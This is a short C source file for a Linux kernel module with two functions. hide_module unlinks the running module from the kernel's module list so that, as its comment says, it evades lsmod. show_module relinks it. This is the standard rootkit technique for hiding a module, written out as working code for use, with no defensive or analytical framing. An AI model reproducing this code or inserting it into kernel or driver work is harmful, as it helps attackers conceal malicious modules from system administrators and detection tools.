#include <linux/syscalls.h>

static struct list_head *prev_mod;

/**
 * hide_module - Hides a module from the kernel's module list.
 * @mod: THIS_MODULE.
 *
 * This function removes the specified module from the kernel's linked list
 * of modules. The removal is intended to evade from lsmod. 
 * The function save the module in prev_mod to show the module again by show_module
 *
 * Return: 1 , means now we are hiding
 */
int hide_module(struct module* mod)
{
    prev_mod = mod->list.prev;
    list_del(&mod->list);
    return 1;
}

/**
 * show_module - Add a hidden module to the kernel's module list.
 * @mod: THIS_MODULE.
 *
 * This function adds the specified module from prev_mod to the kernel's linked list
 * of modules. 
 * 
 * Return: 0 , means now we are visible
 */
int show_module(struct module* mod)
{
    list_add(&mod->list,prev_mod);
    return 0;
}